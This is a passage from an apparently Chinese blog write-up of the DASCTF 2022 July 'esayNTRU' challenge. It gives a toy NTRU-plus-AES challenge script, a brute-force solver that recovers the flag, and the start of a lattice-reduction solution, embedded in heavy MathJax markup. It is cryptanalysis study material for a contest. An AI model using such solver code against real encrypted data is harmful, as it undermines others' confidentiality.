405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mtext" transform="translate(4516,0)"><path data-c="A0" d=""/></g><g data-mml-node="mo" transform="translate(4766,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(5155,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(6033,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(6518,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(7038,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(7288,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(7791,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span></p><h2><span id="dasctf-2022-july-esayntru">Dasctf 2022 July — esayNTRU</span></h2><h4><span id="题目">题目</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Hash import SHA3_256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line"># parameters</span><br><span class="line">N = 10</span><br><span class="line">p = 3</span><br><span class="line">q = 512</span><br><span class="line">d = 3</span><br><span class="line">assert q&gt;(6*d+1)*p</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"></span><br><span class="line">#d1 1s and #d2 -1s</span><br><span class="line">def T(d1, d2):</span><br><span class="line">    assert N &gt;= d1+d2</span><br><span class="line">    s = [1]*d1 + [-1]*d2 + [0]*(N-d1-d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    return R(s)</span><br><span class="line"></span><br><span class="line">def invertModPrime(f, p):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N-1)</span><br><span class="line">    return R(lift(1 / Rp(f)))</span><br><span class="line"></span><br><span class="line">def convolution(f, g):</span><br><span class="line">    return (f*g) % (x^N-1)</span><br><span class="line"></span><br><span class="line">def liftMod(f, q):</span><br><span class="line">    g = list(((f[i] + q//2) % q) - q//2 for i in range(N))</span><br><span class="line">    return R(g)</span><br><span class="line"></span><br><span class="line">def polyMod(f, q):</span><br><span class="line">    g = [f[i]%q for i in range(N)]</span><br><span class="line">    return R(g)</span><br><span class="line"></span><br><span class="line">def invertModPow2(f, q):</span><br><span class="line">    assert q.is_power_of(2)</span><br><span class="line">    g = invertModPrime(f,2)</span><br><span class="line">    while True:</span><br><span class="line">        r = liftMod(convolution(g,f),q)</span><br><span class="line">        if r == 1: return g</span><br><span class="line">        g = liftMod(convolution(g,2 - r),q)</span><br><span class="line"></span><br><span class="line">def genMessage():</span><br><span class="line">    result = list(randrange(p) - 1 for j in range(N))</span><br><span class="line">    return R(result)</span><br><span class="line"></span><br><span class="line">def genKey():</span><br><span class="line">  while True:</span><br><span class="line">    try:</span><br><span class="line">      f = T(d+1, d)</span><br><span class="line">      g = T(d, d)</span><br><span class="line">      Fp = polyMod(invertModPrime(f, p), p)</span><br><span class="line">      Fq = polyMod(invertModPow2(f, q), q)</span><br><span class="line">      break</span><br><span class="line">    except:</span><br><span class="line">      continue</span><br><span class="line">  h = polyMod(convolution(Fq, g), q)</span><br><span class="line">  return h, (f, g)</span><br><span class="line"></span><br><span class="line">def encrypt(m, h):</span><br><span class="line">  e = liftMod(p*convolution(h, T(d, d)) + m, q)</span><br><span class="line">  return e</span><br><span class="line"></span><br><span class="line"># Step 1</span><br><span class="line">h, secret = genKey()</span><br><span class="line">m = genMessage()</span><br><span class="line">e = encrypt(m, h)</span><br><span class="line"></span><br><span class="line">print('h = %s' % h)</span><br><span class="line">print('e = %s' % e)</span><br><span class="line"></span><br><span class="line"># Step 2</span><br><span class="line">sha3 = SHA3_256.new()</span><br><span class="line">sha3.update(bytes(str(m).encode('utf-8')))</span><br><span class="line">key = sha3.digest()</span><br><span class="line"></span><br><span class="line">cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">c = cypher.encrypt(pad(flag, 32))</span><br><span class="line">print('c = %s' % c)</span><br><span class="line"></span><br><span class="line">h = 39*x^9 + 60*x^8 + 349*x^7 + 268*x^6 + 144*x^5 + 469*x^4 + 449*x^3 + 165*x^2 + 248*x + 369</span><br><span class="line">e = -144*x^9 - 200*x^8 - 8*x^7 + 248*x^6 + 85*x^5 + 102*x^4 + 167*x^3 + 30*x^2 - 203*x - 78</span><br><span class="line">c = b'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@}U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span><br></pre></td></tr></table></figure><h4><span id="解题思路">解题思路</span></h4><ul><li>因为m较小，可以直接爆破m。exp:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">from Crypto.Hash import SHA3_256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">c = b'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@}U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">import itertools</span><br><span class="line">t = [1, 0, -1]</span><br><span class="line">for i in itertools.product(t,repeat=10):</span><br><span class="line">    m = list(i)</span><br><span class="line">    m = R(m)</span><br><span class="line">    sha3 = SHA3_256.new()</span><br><span class="line">    sha3 = sha3.update(bytes(str(m).encode('utf-8')))</span><br><span class="line">    key = sha3.digest()</span><br><span class="line">    cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    m = cypher.decrypt(c)</span><br><span class="line">    if b'DASCTF' in m:</span><br><span class="line">        print(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p><strong>格基规约</strong></p><p>参考资料： <a href="https://latticehacks.cr.yp.to/ntru.html">LatticeHacks</a> 和 <a href="https://tl2cents.github.io/2022/07/25/2022DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9BCryptoWriteup/">2022DASCTF7月赋能赛CryptoWriteup</a></p><p>因为参数小的原因，也可以用格来求出m。首先根据定义<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="18.836ex" height="2.245ex" role="img" focusable="false" viewbox="0 -705 8325.7 992.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/></g><g data-mml-node="mo" transform="translate(853.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(1909.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(2634.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="msub" transform="translate(3135,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g><g data-mml-node="mo" transform="translate(4255.5,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="mi" transform="translate(4755.7,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/></g><g data-mml-node="mtext" transform="translate(5232.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mtext" transform="translate(5482.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(5732.7,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(6610.7,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(7095.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(7615.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(7865.7,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g></g></svg></mjx-container></span>。</p><p>我们造格只需要制造<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="9.694ex" height="2.367ex" role="img" focusable="false" viewbox="0 -759 4284.7 1046.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/></g><g data-mml-node="mi" transform="translate(609,363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/></g></g><g data-mml-node="mo" transform="translate(1131.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="msub" transform="translate(2187,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g><g data-mml-node="mo" transform="translate(3307.5,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="mi" transform="translate(3807.7,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/></g></g></g></svg></mjx-container></span>，已知<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewbox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g></g></svg></mjx-container></span>。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">Integers(q)(1/3)</span><br><span class="line"># output: 171</span><br><span class="line">h3 = (171*h)%q</span><br></pre></td></tr></table></figure><p>​ <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.378ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 1051 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/></g></g></g></svg></mjx-container></span>的构造如下： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.149ex;" xmlns="http://www.w3.org/2000/svg" width="50.191ex" height="5.43ex" role="img" focusable="false" viewbox="0 -1450 22184.6 2400"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/></g><g data-mml-node="mo" transform="translate(1328.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 